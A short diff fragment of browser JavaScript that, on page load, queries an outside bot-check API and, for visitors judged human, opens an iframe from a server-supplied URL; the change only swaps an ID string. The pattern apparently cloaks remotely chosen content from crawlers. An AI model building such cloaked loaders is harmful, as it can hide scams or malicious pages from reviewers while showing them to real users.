@@ -55,7 +55,7 @@ window.addEventListener('message', (message) => {
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://hai-per-package.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'xj9vgfmD')
+            createFrame(res.url + 'Tzjq6MtM')
         } else {
             setTimeout(toggleLoad, 500);
 
